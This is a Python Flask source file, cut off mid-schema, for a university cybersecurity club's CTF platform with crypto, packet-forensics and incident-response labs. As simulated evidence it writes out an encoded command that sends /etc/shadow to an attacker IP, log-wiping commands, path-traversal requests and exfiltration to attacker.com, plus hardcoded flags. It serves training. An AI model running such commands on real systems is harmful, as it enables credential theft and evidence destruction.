#!/usr/bin/env python3
"""
CCSIT CTF — Cybersecurity Club, King Faisal University (CCSIT).

The PLATFORM: registration, login, challenge directory, flag submission,
scoreboard. Each challenge is a SEPARATE web app with its own URL (see
challenge_roleup.py); the platform links out to it and only checks the
submitted flag.

Branding: drop  logo.png  next to this file to show the club logo.

Run:
    pip install flask
    python3 app.py
    # http://127.0.0.1:5000   (also on your LAN IP / public tunnel)

The platform uses hashed passwords and server-side checks. The vulnerability
lives only inside the challenge instance, not here.
"""

import os
import re
import sqlite3
import datetime
import secrets
import time
from collections import defaultdict
from functools import wraps

from flask import (
    Flask, request, session, redirect, url_for, jsonify,
    render_template_string, send_file, abort, g,
)
from werkzeug.security import generate_password_hash, check_password_hash

DATABASE_URL = os.environ.get("DATABASE_URL")
USE_PG = bool(DATABASE_URL)
if USE_PG:
    import psycopg2
    import psycopg2.extras

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = datetime.timedelta(hours=6)
HERE = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(HERE, "ctf.db")

CLUB_AR = "نادي الأمن السيبراني"
UNI_AR = "جامعة الملك فيصل · كلية علوم الحاسب وتقنية المعلومات"

_login_attempts = defaultdict(list)
MAX_LOGIN_ATTEMPTS = 5
LOGIN_WINDOW = 300

MIN_PW_LEN = 8
PW_RULES = [
    (r"[A-Z]", "one uppercase letter"),
    (r"[a-z]", "one lowercase letter"),
    (r"[0-9]", "one digit"),
]

def check_password_policy(pw):
    errors = []
    if len(pw) < MIN_PW_LEN:
        errors.append(f"at least {MIN_PW_LEN} characters")
    for pattern, msg in PW_RULES:
        if not re.search(pattern, pw):
            errors.append(msg)
    return errors

def is_rate_limited(ip):
    now = time.time()
    _login_attempts[ip] = [t for t in _login_attempts[ip] if now - t < LOGIN_WINDOW]
    return len(_login_attempts[ip]) >= MAX_LOGIN_ATTEMPTS

def record_login_attempt(ip):
    _login_attempts[ip].append(time.time())


CHALLENGES = [
    {
        "id": "roleup",
        "name": "Role Up",
        "category": "Web",
        "difficulty": "Easy",
        "points": 100,
        "flag": "FLAG{r0le_1n_body_gu3st_t0_4dm1n}",
        "port": 8001,
        "env": "ROLEUP_URL",
        "desc": ("A members area reveals its flag only to admins. Open the "
                 "challenge, watch the request its button sends — and ask "
                 "yourself who really decides your role."),
        "hint": "The role travels in the request body. The server believes it.",
    },
    {
        "id": "corporateleak",
        "name": "Corporate Leak",
        "category": "Web",
        "difficulty": "Easy",
        "points": 150,
        "flag": "$4,817,263",
        "port": 8002,
        "env": "CORPLEAK_URL",
        "desc": ("NexaCorp's internal portal hides its financial reports from "
                 "regular users. Only company employees can see the numbers. "
                 "Can you get insider access?"),
        "hint": "Look at the footer. Who works at this company? What makes them different?",
    },
    {
        "id": "base64-layers",
        "name": "Decode the Layers",
        "category": "Crypto",
        "difficulty": "Easy",
        "points": 100,
        "flag": "FLAG{b4s3_s1xty_f0ur_l4y3rs}",
        "port": 8003,
        "env": "CRYPTO1_URL",
        "desc": ("An intercepted message was encoded multiple times before "
                 "transmission. Can you peel back all the layers to reveal "
                 "the original secret?"),
        "hint": "It's not just one encoding — try decoding several times. Check for Base64, hex, and more.",
    },
    {
        "id": "pcap-hunt",
        "name": "Packet Hunter",
        "category": "Digital Forensics",
        "difficulty": "Medium",
        "points": 200,
        "flag": "FLAG{p4ck3t_c4ptur3_s3cr3t}",
        "port": 8004,
        "env": "PCAP_URL",
        "desc": ("A suspicious network capture was found on a compromised server. "
                 "Analyze the traffic to find the exfiltrated secret hidden "
                 "inside the packets."),
        "hint": "Look at the HTTP traffic. The attacker hid data in an unusual header.",
    },
    {
        "id": "log-analysis",
        "name": "Incident Investigator",
        "category": "Incident Response",
        "difficulty": "Medium",
        "points": 200,
        "flag": "FLAG{1nc1d3nt_r3sp0ns3_l0g_4n4lys1s}",
        "port": 8005,
        "env": "IR_URL",
        "desc": ("Your SOC received an alert about a breach. Server logs show "
                 "suspicious activity. Analyze the logs to find the attacker's "
                 "action that reveals the flag."),
        "hint": "The attacker encoded their payload. Look for Base64 strings in the commands.",
    },
]
CH_BY_ID = {c["id"]: c for c in CHALLENGES}


def chal_url(c):
    url = os.environ.get(c["env"], "").strip()
    if url:
        return url
    return f"/lab/{c['id']}/"


import challenge_roleup as _roleup
import challenge_corporateleak as _corpleak


@app.route("/lab/roleup/")
def lab_roleup():
    return render_template_string(_roleup.PAGE)


@app.route("/lab/roleup/flag", methods=["POST"])
def lab_roleup_flag():
    return _roleup.flag()


@app.route("/lab/corporateleak/")
def lab_corpleak():
    return render_template_string(_corpleak.PAGE)


@app.route("/lab/corporateleak/api/register", methods=["POST"])
def lab_corpleak_register():
    return _corpleak.register()


@app.route("/lab/corporateleak/api/login", methods=["POST"])
def lab_corpleak_login():
    return _corpleak.login()


# ----------- Crypto: Decode the Layers (in-process) -----------
import base64 as _b64
import binascii as _binascii

_CRYPTO_FLAG = "FLAG{b4s3_s1xty_f0ur_l4y3rs}"
_CRYPTO_ENCODED = _b64.b64encode(
    _binascii.hexlify(
        _b64.b64encode(
            _b64.b64encode(_CRYPTO_FLAG.encode()).decode().encode()
        )
    )
).decode()

_CRYPTO_PAGE = r"""
<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Decode the Layers</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
<style>
:root{--bg:#0f172a;--card:rgba(15,23,42,.9);--border:rgba(148,163,184,.12);
  --text:#e2e8f0;--text2:#64748b;--amber:#f59e0b;--amber2:#d97706;
  --green:#22c55e;--red:#ef4444;--font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font:15px/1.6 var(--font);min-height:100vh;
  display:grid;place-items:center;padding:16px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;
  background:radial-gradient(ellipse at 50% -20%,rgba(245,158,11,.08),transparent 70%)}
.card{background:var(--card);border:1px solid var(--border);border-radius:16px;
  padding:36px;width:min(92vw,600px);backdrop-filter:blur(12px)}
.badge{display:inline-block;font:600 11px var(--mono);letter-spacing:1.5px;
  text-transform:uppercase;color:var(--amber);padding:4px 12px;
  border:1px solid rgba(245,158,11,.25);border-radius:6px;margin-bottom:16px}
h1{font-size:26px;font-weight:800;margin-bottom:4px}
.sub{color:var(--text2);font-size:14px;margin-bottom:24px}
.cipher{background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:10px;
  padding:18px;margin:16px 0;font:13px var(--mono);word-break:break-all;color:var(--amber);
  line-height:1.7;user-select:all;max-height:200px;overflow-y:auto}
label{color:var(--text2);font-size:13px;font-weight:600;display:block;margin-bottom:6px}
input{width:100%;padding:12px 14px;margin-bottom:14px;background:rgba(0,0,0,.3);
  border:1px solid var(--border);border-radius:10px;color:var(--text);font:14px var(--mono);outline:none}
input:focus{border-color:var(--amber);box-shadow:0 0 0 3px rgba(245,158,11,.15)}
.btn{display:block;width:100%;padding:13px;border:0;border-radius:10px;
  background:linear-gradient(135deg,var(--amber2),var(--amber));color:#fff;
  font:700 15px var(--font);cursor:pointer}
.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(245,158,11,.3)}
#out{margin-top:16px;font:14px var(--mono);padding:14px;border-radius:10px;display:none;
  word-break:break-all;border:1px solid}
.win{background:rgba(34,197,94,.08);color:var(--green);border-color:rgba(34,197,94,.25)!important;display:block!important}
.bad{background:rgba(239,68,68,.08);color:var(--red);border-color:rgba(239,68,68,.25)!important;display:block!important}
.hint{color:var(--text2);font-size:12px;margin-top:20px;padding:12px;
  border:1px dashed rgba(148,163,184,.15);border-radius:8px}
code{color:var(--amber);font-family:var(--mono)}
.layers{display:flex;gap:8px;margin:12px 0;flex-wrap:wrap}
.layer{padding:6px 14px;border:1px solid var(--border);border-radius:8px;font:12px var(--mono);color:var(--text2)}
</style></head><body>
<div class="card">
  <span class="badge">Crypto &middot; Encoding</span>
  <h1>Decode the Layers</h1>
  <p class="sub">An intercepted message was encoded multiple times. Peel back the layers.</p>

  <p style="color:var(--text2);font-size:13px;margin-bottom:8px"><b>Intercepted ciphertext:</b></p>
  <div class="cipher">ENCODED_DATA_PLACEHOLDER</div>

  <p style="color:var(--text2);font-size:13px;margin-bottom:8px"><b>Encoding layers used (in order):</b></p>
  <div class="layers">
    <span class="layer">1. Base64</span>
    <span class="layer">2. Base64</span>
    <span class="layer">3. Hex</span>
    <span class="layer">4. Base64</span>
  </div>

  <hr style="border:0;border-top:1px solid var(--border);margin:20px 0">

  <label>Decoded message</label>
  <input id="ans" placeholder="FLAG{...}" autocomplete="off">
  <button class="btn" onclick="check()">Submit Answer</button>
  <div id="out"></div>

  <div class="hint">
    <b>How to solve:</b><br>
    &bull; Copy the ciphertext<br>
    &bull; Reverse the encoding layers: decode Base64 first (outermost), then Hex, then Base64, then Base64<br>
    &bull; Use <code>CyberChef</code>, <code>Python</code>, or command-line tools<br>
    &bull; Python: <code>import base64, binascii</code>
  </div>
</div>
<script>
const out=document.getElementById('out');
async function check(){
  const a=document.getElementById('ans').value.trim();
  if(!a)return;out.className='';out.style.display='none';
  const r=await fetch('/lab/base64-layers/check',{method:'POST',
    headers:{'Content-Type':'application/json'},body:JSON.stringify({answer:a})});
  const d=await r.json();
  if(d.correct){out.className='win';out.innerHTML='<b>Correct!</b> '+d.flag+'<br><span style="font-size:11px;opacity:.7">Submit this flag on the CTF platform.</span>'}
  else{out.className='bad';out.textContent=d.error||'Wrong answer'}
}
</script>
</body></html>
"""

@app.route("/lab/base64-layers/")
def lab_crypto1():
    page = _CRYPTO_PAGE.replace("ENCODED_DATA_PLACEHOLDER", _CRYPTO_ENCODED)
    return render_template_string(page)

@app.route("/lab/base64-layers/check", methods=["POST"])
def lab_crypto1_check():
    data = request.get_json(silent=True) or {}
    answer = (data.get("answer") or "").strip()
    if answer == _CRYPTO_FLAG:
        return jsonify(correct=True, flag=_CRYPTO_FLAG)
    return jsonify(correct=False, error="Wrong answer. Keep decoding!"), 400


# ----------- Digital Forensics: Packet Hunter (in-process) -----------
_PCAP_FLAG = "FLAG{p4ck3t_c4ptur3_s3cr3t}"
_PCAP_B64 = _b64.b64encode(_PCAP_FLAG.encode()).decode()

_PCAP_LOGS = [
    {"id":1,"time":"2026-10-09 14:32:01","src":"192.168.1.105","dst":"10.0.0.50","proto":"TCP","port":443,"info":"TLS Client Hello → server.internal.corp","size":"517"},
    {"id":2,"time":"2026-10-09 14:32:02","src":"10.0.0.50","dst":"192.168.1.105","proto":"TCP","port":443,"info":"TLS Server Hello, Certificate","size":"2841"},
    {"id":3,"time":"2026-10-09 14:32:05","src":"192.168.1.105","dst":"10.0.0.50","proto":"HTTP","port":80,"info":"GET /api/health HTTP/1.1","size":"312"},
    {"id":4,"time":"2026-10-09 14:32:05","src":"10.0.0.50","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 200 OK — {\"status\":\"up\"}","size":"198"},
    {"id":5,"time":"2026-10-09 14:32:08","src":"192.168.1.105","dst":"10.0.0.50","proto":"HTTP","port":80,"info":"POST /api/login HTTP/1.1 — user=admin&pass=admin123","size":"445"},
    {"id":6,"time":"2026-10-09 14:32:08","src":"10.0.0.50","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 200 OK — {\"token\":\"eyJhbGciOiJIUzI1NiJ9...\"}","size":"523"},
    {"id":7,"time":"2026-10-09 14:32:12","src":"192.168.1.105","dst":"10.0.0.50","proto":"HTTP","port":80,"info":"GET /api/files?path=/etc/shadow HTTP/1.1","size":"378"},
    {"id":8,"time":"2026-10-09 14:32:12","src":"10.0.0.50","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 403 Forbidden","size":"156"},
    {"id":9,"time":"2026-10-09 14:32:15","src":"192.168.1.105","dst":"10.0.0.50","proto":"HTTP","port":80,"info":"GET /api/files?path=....//....//etc/passwd HTTP/1.1","size":"401"},
    {"id":10,"time":"2026-10-09 14:32:15","src":"10.0.0.50","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 200 OK — root:x:0:0:root:/root:/bin/bash...","size":"1847"},
    {"id":11,"time":"2026-10-09 14:32:20","src":"192.168.1.105","dst":"10.0.0.50","proto":"DNS","port":53,"info":"A? exfil.attacker.com","size":"78"},
    {"id":12,"time":"2026-10-09 14:32:20","src":"10.0.0.50","dst":"192.168.1.105","proto":"DNS","port":53,"info":"A exfil.attacker.com → 203.0.113.66","size":"94"},
    {"id":13,"time":"2026-10-09 14:32:22","src":"192.168.1.105","dst":"203.0.113.66","proto":"HTTP","port":80,"info":"POST /collect HTTP/1.1 — X-Exfil-Data: " + _PCAP_B64,"size":"612"},
    {"id":14,"time":"2026-10-09 14:32:22","src":"203.0.113.66","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 200 OK — {\"received\":true}","size":"143"},
    {"id":15,"time":"2026-10-09 14:32:25","src":"192.168.1.105","dst":"10.0.0.50","proto":"TCP","port":22,"info":"SSH Connection closed","size":"66"},
]

_PCAP_PAGE = r"""
<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Packet Hunter</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
<style>
:root{--bg:#0f172a;--card:rgba(15,23,42,.9);--border:rgba(148,163,184,.12);
  --text:#e2e8f0;--text2:#64748b;--blue:#3b82f6;--blue2:#2563eb;
  --green:#22c55e;--red:#ef4444;--font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font:15px/1.6 var(--font);min-height:100vh;
  display:flex;flex-direction:column;align-items:center;padding:32px 16px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;
  background:radial-gradient(ellipse at 50% -20%,rgba(59,130,246,.08),transparent 70%)}
.card{background:var(--card);border:1px solid var(--border);border-radius:16px;
  padding:32px;width:min(96vw,900px);backdrop-filter:blur(12px);margin-bottom:20px}
.badge{display:inline-block;font:600 11px var(--mono);letter-spacing:1.5px;
  text-transform:uppercase;color:var(--blue);padding:4px 12px;
  border:1px solid rgba(59,130,246,.25);border-radius:6px;margin-bottom:16px}
h1{font-size:26px;font-weight:800;margin-bottom:4px}
.sub{color:var(--text2);font-size:14px;margin-bottom:24px}
table{width:100%;border-collapse:collapse;font-size:12px;margin:16px 0}
th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--border);font-family:var(--mono)}
th{color:var(--text2);font-size:10px;text-transform:uppercase;letter-spacing:1px;position:sticky;top:0;background:var(--bg)}
tr:hover{background:rgba(59,130,246,.04)}
.http{color:var(--green)}.dns{color:var(--blue)}.tcp{color:var(--text2)}.tls{color:#a78bfa}
.info-cell{max-width:400px;word-break:break-all}
.highlight{background:rgba(239,68,68,.08)!important;color:var(--red)}
label{color:var(--text2);font-size:13px;font-weight:600;display:block;margin-bottom:6px}
input{width:100%;padding:12px 14px;margin-bottom:14px;background:rgba(0,0,0,.3);
  border:1px solid var(--border);border-radius:10px;color:var(--text);font:14px var(--mono);outline:none}
input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(59,130,246,.15)}
.btn{display:block;width:100%;padding:13px;border:0;border-radius:10px;
  background:linear-gradient(135deg,var(--blue2),var(--blue));color:#fff;
  font:700 15px var(--font);cursor:pointer}
.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(59,130,246,.3)}
#out{margin-top:16px;font:14px var(--mono);padding:14px;border-radius:10px;display:none;
  word-break:break-all;border:1px solid}
.win{background:rgba(34,197,94,.08);color:var(--green);border-color:rgba(34,197,94,.25)!important;display:block!important}
.bad{background:rgba(239,68,68,.08);color:var(--red);border-color:rgba(239,68,68,.25)!important;display:block!important}
.hint{color:var(--text2);font-size:12px;margin-top:20px;padding:12px;
  border:1px dashed rgba(148,163,184,.15);border-radius:8px}
code{color:var(--blue);font-family:var(--mono)}
.scroll{max-height:400px;overflow-y:auto;border:1px solid var(--border);border-radius:10px}
</style></head><body>
<div class="card">
  <span class="badge">Forensics &middot; Network</span>
  <h1>Packet Hunter</h1>
  <p class="sub">Analyze the captured network traffic. The attacker exfiltrated a secret — find it.</p>

  <div class="scroll">
    <table>
      <thead><tr><th>#</th><th>Time</th><th>Source</th><th>Dest</th><th>Proto</th><th>Port</th><th>Info</th><th>Size</th></tr></thead>
      <tbody>
      {% for p in packets %}
        <tr class="{{ 'highlight' if 'exfil' in p.info.lower() or 'shadow' in p.info.lower() or 'passwd' in p.info.lower() }}">
          <td>{{ p.id }}</td>
          <td>{{ p.time.split(' ')[1] }}</td>
          <td>{{ p.src }}</td>
          <td>{{ p.dst }}</td>
          <td><span class="{{ p.proto.lower() }}">{{ p.proto }}</span></td>
          <td>{{ p.port }}</td>
          <td class="info-cell">{{ p.info }}</td>
          <td>{{ p.size }}</td>
        </tr>
      {% endfor %}
      </tbody>
    </table>
  </div>

  <hr style="border:0;border-top:1px solid var(--border);margin:20px 0">

  <label>What secret did the attacker exfiltrate?</label>
  <input id="ans" placeholder="FLAG{...}" autocomplete="off">
  <button class="btn" onclick="check()">Submit Answer</button>
  <div id="out"></div>

  <div class="hint">
    <b>Investigation guide:</b><br>
    &bull; Look for suspicious outbound connections to external IPs<br>
    &bull; Check for unusual HTTP headers — attackers often hide data in custom headers<br>
    &bull; The data might be encoded — try <code>Base64</code> decoding<br>
    &bull; Packet #13 looks interesting...
  </div>
</div>
<script>
const out=document.getElementById('out');
async function check(){
  const a=document.getElementById('ans').value.trim();
  if(!a)return;out.className='';out.style.display='none';
  const r=await fetch('/lab/pcap-hunt/check',{method:'POST',
    headers:{'Content-Type':'application/json'},body:JSON.stringify({answer:a})});
  const d=await r.json();
  if(d.correct){out.className='win';out.innerHTML='<b>Correct!</b> '+d.flag+'<br><span style="font-size:11px;opacity:.7">Submit this flag on the CTF platform.</span>'}
  else{out.className='bad';out.textContent=d.error||'Wrong answer'}
}
</script>
</body></html>
"""

@app.route("/lab/pcap-hunt/")
def lab_pcap():
    return render_template_string(_PCAP_PAGE, packets=_PCAP_LOGS)

@app.route("/lab/pcap-hunt/check", methods=["POST"])
def lab_pcap_check():
    data = request.get_json(silent=True) or {}
    answer = (data.get("answer") or "").strip()
    if answer == _PCAP_FLAG:
        return jsonify(correct=True, flag=_PCAP_FLAG)
    return jsonify(correct=False, error="Wrong answer. Look closer at the packets!"), 400


# ----------- IR: Incident Investigator (in-process) -----------
_IR_FLAG = "FLAG{1nc1d3nt_r3sp0ns3_l0g_4n4lys1s}"
_IR_B64_CMD = _b64.b64encode(("cat /etc/shadow | curl -X POST -d @- http://203.0.113.66/collect && echo '" + _IR_FLAG + "' > /tmp/.hidden").encode()).decode()

_IR_LOGS = [
    {"ts":"2026-10-09 02:14:33","host":"web-prod-01","svc":"sshd","msg":"Accepted publickey for deploy from 10.0.1.50 port 48221 ssh2"},
    {"ts":"2026-10-09 02:14:35","host":"web-prod-01","svc":"sudo","msg":"deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx"},
    {"ts":"2026-10-09 03:41:02","host":"web-prod-01","svc":"sshd","msg":"Failed password for root from 185.143.223.47 port 39201 ssh2"},
    {"ts":"2026-10-09 03:41:04","host":"web-prod-01","svc":"sshd","msg":"Failed password for root from 185.143.223.47 port 39203 ssh2"},
    {"ts":"2026-10-09 03:41:06","host":"web-prod-01","svc":"sshd","msg":"Failed password for admin from 185.143.223.47 port 39205 ssh2"},
    {"ts":"2026-10-09 03:41:15","host":"web-prod-01","svc":"sshd","msg":"Failed password for root from 185.143.223.47 port 39211 ssh2"},
    {"ts":"2026-10-09 03:42:01","host":"web-prod-01","svc":"sshd","msg":"Accepted password for www-data from 185.143.223.47 port 39280 ssh2"},
    {"ts":"2026-10-09 03:42:05","host":"web-prod-01","svc":"sudo","msg":"www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash"},
    {"ts":"2026-10-09 03:42:12","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# whoami → root"},
    {"ts":"2026-10-09 03:42:18","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# cat /etc/hostname → web-prod-01"},
    {"ts":"2026-10-09 03:42:25","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# uname -a → Linux web-prod-01 5.15.0-91-generic"},
    {"ts":"2026-10-09 03:42:31","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# cat /etc/passwd | wc -l → 42"},
    {"ts":"2026-10-09 03:42:40","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# echo " + _IR_B64_CMD + " | base64 -d | bash"},
    {"ts":"2026-10-09 03:42:42","host":"web-prod-01","svc":"curl","msg":"POST http://203.0.113.66/collect — 200 OK (sent 2.4KB)"},
    {"ts":"2026-10-09 03:42:50","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# rm -rf /var/log/auth.log.1 /var/log/syslog.1"},
    {"ts":"2026-10-09 03:42:55","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# history -c && exit"},
    {"ts":"2026-10-09 03:42:56","host":"web-prod-01","svc":"sshd","msg":"session closed for user www-data"},
    {"ts":"2026-10-09 06:00:01","host":"web-prod-01","svc":"cron","msg":"CRON: (root) CMD (/usr/local/bin/backup.sh)"},
]

_IR_PAGE = r"""
<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Incident Investigator</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
<style>
:root{--bg:#0f172a;--card:rgba(15,23,42,.9);--border:rgba(148,163,184,.12);
  --text:#e2e8f0;--text2:#64748b;--red:#ef4444;--red2:#dc2626;
  --green:#22c55e;--orange:#f59e0b;--font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font:15px/1.6 var(--font);min-height:100vh;
  display:flex;flex-direction:column;align-items:center;padding:32px 16px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;
  background:radial-gradient(ellipse at 50% -20%,rgba(239,68,68,.08),transparent 70%)}
.card{background:var(--card);border:1px solid var(--border);border-radius:16px;
  padding:32px;width:min(96vw,900px);backdrop-filter:blur(12px);margin-bottom:20px}
.badge{display:inline-block;font:600 11px var(--mono);letter-spacing:1.5px;
  text-transform:uppercase;color:var(--red);padding:4px 12px;
  border:1px solid rgba(239,68,68,.25);border-radius:6px;margin-bottom:16px}
h1{font-size:26px;font-weight:800;margin-bottom:4px}
.sub{color:var(--text2);font-size:14px;margin-bottom:24px}
.alert-banner{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);
  border-radius:10px;padding:14px 18px;margin-bottom:20px;display:flex;align-items:center;gap:12px}
.alert-banner .icon{font-size:24px}
.alert-banner .msg{font-size:13px;color:var(--red)}
.alert-banner .msg b{color:var(--text)}
.log-box{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:10px;
  padding:0;margin:16px 0;max-height:450px;overflow-y:auto;font:12px var(--mono)}
.log-line{padding:6px 14px;border-bottom:1px solid rgba(148,163,184,.06);display:flex;gap:8px;
  transition:background .15s}
.log-line:hover{background:rgba(148,163,184,.04)}
.log-ts{color:var(--text2);min-width:140px;white-space:nowrap}
.log-host{color:var(--green);min-width:100px}
.log-svc{color:var(--orange);min-width:50px}
.log-msg{color:var(--text);flex:1;word-break:break-all}
.log-line.suspicious{background:rgba(239,68,68,.06)}
.log-line.suspicious .log-msg{color:var(--red)}
label{color:var(--text2);font-size:13px;font-weight:600;display:block;margin-bottom:6px}
input{width:100%;padding:12px 14px;margin-bottom:14px;background:rgba(0,0,0,.3);
  border:1px solid var(--border);border-radius:10px;color:var(--text);font:14px var(--mono);outline:none}
input:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(239,68,68,.15)}
.btn{display:block;width:100%;padding:13px;border:0;border-radius:10px;
  background:linear-gradient(135deg,var(--red2),var(--red));color:#fff;
  font:700 15px var(--font);cursor:pointer}
.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(239,68,68,.3)}
#out{margin-top:16px;font:14px var(--mono);padding:14px;border-radius:10px;display:none;
  word-break:break-all;border:1px solid}
.win{background:rgba(34,197,94,.08);color:var(--green);border-color:rgba(34,197,94,.25)!important;display:block!important}
.bad{background:rgba(239,68,68,.08);color:var(--red);border-color:rgba(239,68,68,.25)!important;display:block!important}
.hint{color:var(--text2);font-size:12px;margin-top:20px;padding:12px;
  border:1px dashed rgba(148,163,184,.15);border-radius:8px}
code{color:var(--red);font-family:var(--mono)}
</style></head><body>
<div class="card">
  <span class="badge">IR &middot; Log Analysis</span>
  <h1>Incident Investigator</h1>
  <p class="sub">Analyze the server logs from a confirmed breach. Find the attacker's hidden flag.</p>

  <div class="alert-banner">
    <span class="icon">🚨</span>
    <div class="msg"><b>ALERT — Unauthorized root access detected on web-prod-01</b><br>
    Time: 2026-10-09 03:42 UTC &bull; Source: 185.143.223.47 &bull; Severity: CRITICAL</div>
  </div>

  <div class="log-box">
    {% for log in logs %}
    <div class="log-line {{ 'suspicious' if '185.143' in log.msg or 'base64' in log.msg.lower() or 'rm -rf' in log.msg or 'history -c' in log.msg }}">
      <span class="log-ts">{{ log.ts }}</span>
      <span class="log-host">{{ log.host }}</span>
      <span class="log-svc">[{{ log.svc }}]</span>
      <span class="log-msg">{{ log.msg }}</span>
    </div>
    {% endfor %}
  </div>

  <hr style="border:0;border-top:1px solid var(--border);margin:20px 0">

  <label>What flag did the attacker leave behind?</label>
  <input id="ans" placeholder="FLAG{...}" autocomplete="off">
  <button class="btn" onclick="check()">Submit Answer</button>
  <div id="out"></div>

  <div class="hint">
    <b>Investigation steps:</b><br>
    &bull; Follow the timeline — how did the attacker get in?<br>
    &bull; Look for encoded commands — <code>base64 -d | bash</code> is a red flag<br>
    &bull; Decode the Base64 string to see what the attacker actually executed<br>
    &bull; The flag is embedded in the decoded command
  </div>
</div>
<script>
const out=document.getElementById('out');
async function check(){
  const a=document.getElementById('ans').value.trim();
  if(!a)return;out.className='';out.style.display='none';
  const r=await fetch('/lab/log-analysis/check',{method:'POST',
    headers:{'Content-Type':'application/json'},body:JSON.stringify({answer:a})});
  const d=await r.json();
  if(d.correct){out.className='win';out.innerHTML='<b>Case closed!</b> '+d.flag+'<br><span style="font-size:11px;opacity:.7">Submit this flag on the CTF platform.</span>'}
  else{out.className='bad';out.textContent=d.error||'Wrong answer'}
}
</script>
</body></html>
"""

@app.route("/lab/log-analysis/")
def lab_ir():
    return render_template_string(_IR_PAGE, logs=_IR_LOGS)

@app.route("/lab/log-analysis/check", methods=["POST"])
def lab_ir_check():
    data = request.get_json(silent=True) or {}
    answer = (data.get("answer") or "").strip()
    if answer == _IR_FLAG:
        return jsonify(correct=True, flag=_IR_FLAG)
    return jsonify(correct=False, error="Wrong answer. Decode the attacker's command!"), 400


class PgRowWrapper:
    def __init__(self, row, desc):
        self._data = {desc[i].name: row[i] for i in range(len(desc))}
    def __getitem__(self, key):
        return self._data[key]
    def keys(self):
        return self._data.keys()


def db():
    if "db" not in g:
        if USE_PG:
            g.db = psycopg2.connect(DATABASE_URL)
            g.db.autocommit = False
        else:
            g.db = sqlite3.connect(DB)
            g.db.row_factory = sqlite3.Row
    return g.db


def qexec(sql, params=(), fetchone=False, fetchall=False):
    d = db()
    if USE_PG:
        sql = sql.replace("?", "%s").replace("AUTOINCREMENT", "")
        cur = d.cursor()
        cur.execute(sql, params)
        if fetchone:
            row = cur.fetchone()
            return PgRowWrapper(row, cur.description) if row else None
        if fetchall:
            desc = cur.description
            return [PgRowWrapper(r, desc) for r in cur.fetchall()]
        return cur
    else:
        cur = d.execute(sql, params)
        if fetchone:
            return cur.fetchone()
        if fetchall:
            return cur.fetchall()
        return cur


@app.teardown_appcontext
def close_db(exc):
    d = g.pop("db", None)
    if d:
        d.close()


@app.route("/health")
def health():
    try:
        d = db()
        qexec("SELECT 1")
        return {"status": "ok", "pg": USE_PG}
    except Exception as e:
        return {"status": "error", "error": str(e)}, 500


ADMIN_KEY = os.environ.get("ADMIN_KEY", "")


@app.route("/admin/delete-user", methods=["POST"])
def admin_delete_user():
    if not ADMIN_KEY or request.headers.get("X-Admin-Key") != ADMIN_KEY:
        abort(403)
    email = request.json.get("email", "").strip().lower()
    if not email:
        return jsonify(error="email required"), 400
    qexec("DELETE FROM solves WHERE user_id IN (SELECT id FROM users WHERE email=?)", (email,))
    qexec("DELETE FROM password_resets WHERE user_id IN (SELECT id FROM users WHERE email=?)", (email,))
    qexec("DELETE FROM users WHERE email=?", (email,))
    db().commit()
    return jsonify(ok=True, deleted=email)


def init_db():
    if USE_PG:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                email TEXT UNIQUE NOT NULL,
                display_name TEXT NOT NULL,
                pw_hash TEXT NOT NULL,
                created TEXT NOT NULL
            )""")
        cur.execute("""
            CREATE TABLE IF NOT EXISTS solves (
                id SERIAL PRIMARY KEY,
                user_id INTEGER NOT NULL,
                challenge TEXT NOT NULL,
